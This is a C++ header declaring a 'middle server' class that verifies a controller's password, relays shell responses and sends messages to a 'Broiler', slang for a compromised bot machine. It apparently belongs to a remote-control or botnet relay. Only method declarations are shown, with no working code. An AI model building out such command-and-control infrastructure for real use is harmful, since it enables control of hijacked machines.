//
// Created by wj_de on 18-5-27.
//

#ifndef MIDDLE_SERVER_REQUETSHANDEL_H
#define MIDDLE_SERVER_REQUETSHANDEL_H
#endif //MIDDLE_SERVER_REQUETSHANDEL_H

#include <map>
#include<iostream>
#include "dataclass.h"
using namespace std;

class Base {
    map<string, string> dt;
    Cdata *data;
    struct info {
        string ip;
        int port;
        int socket;
    } coon_info;

    void find_url();
    bool Controller_Verify(string hax);//控制端密码验证
    void login();

    void cout_info();

    void to_Broiler();//向被控端发送信息
    void shellreq();//控制端返回的信息
    void return_eero(string eero);//返回错误信息函数
public:
    void Base_init(int coon, string ip, int port, string req);  //把socket和ip端口和接受到的信息进行实例化
};
